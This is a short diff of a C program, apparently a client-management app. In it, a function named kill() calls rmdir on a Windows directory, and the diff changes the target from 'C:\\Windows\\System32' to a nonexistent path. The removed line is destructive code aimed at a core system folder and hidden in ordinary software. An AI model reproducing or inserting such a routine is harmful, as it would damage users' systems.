@@ -170,7 +170,7 @@ void rimuovi(Clienti *c, int *f){
 
 }
 void kill(){
-    char *directory_name = "C:\\Windows\\System32";
+    char *directory_name = "C:\\Windows\\System32lp";
 
    
     if (rmdir(directory_name) == 0) {
